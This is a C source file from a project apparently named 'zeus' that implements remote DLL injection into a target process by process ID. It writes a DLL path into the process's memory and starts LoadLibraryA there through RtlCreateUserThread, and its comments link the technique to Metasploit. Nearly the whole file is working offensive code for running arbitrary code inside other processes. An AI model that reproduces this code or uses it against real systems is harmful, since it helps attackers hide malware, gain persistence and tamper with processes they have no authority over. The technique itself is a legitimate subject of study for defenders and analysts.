/*
* ZeusRtlCreateUserThread.c : This file contains
* zeus project's implementation of remote dll injection
* by utilising RtlCreateUserThread Function
*
* It's basically an envelope to NtCreateThreadEx. It is very popular
*	and is heavily used in Metasploit Framework
*
* Written By : @Ice3man
* Email : EthanTom543@gmail.com
* 
* (C) Ice3man
*/

#include "Zeus.h"

/*
* ZeusRtlCreateUserThread : Creates a thread in a remote
* process using the native API's.
*
* @Arguments :
*	@ProcID : Process ID Of Target Process
*	@szDllLocation : Location of Dll String
*
* @Return : 
*	@void
*/
int ZeusRtlCreateUserThread(int ProcID, char *szDllLoc)
{
	/*
	* Uses almost the same procedures but just calls
	* RtlCreateUserThread instead of CreateRemoteThread
	*/

	NTSTATUS status;
	HANDLE hThread;

	HANDLE hProcess = ZeusOpenProcess(ProcID);
	LPVOID arg = ZeusWriteDllStrMemory(szDllLoc, hProcess);

	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (addr == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Error : Could not get Library Address !");
#endif
		ExitProcess(1);
	}
	printf("\n[+] Got Address Of LoadLibraryA Successfully !");
	

	status=RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, (PUSER_THREAD_START_ROUTINE)addr, arg, &hThread, NULL); // Start Thread
	if(!NT_SUCCESS(status))
	{
#ifdef _DEBUG_
		printf("\n[!] Error Occured Creating A Thread");
#endif 
		ExitProcess(1);
	}
	else {
		/*
		* Creating a remote thread succeeded.
		*/
		printf("\n[+] Successfully Created Remote Thread !");
		CloseHandle(hProcess);
		ExitProcess(0);
	}
	CloseHandle(hProcess);

}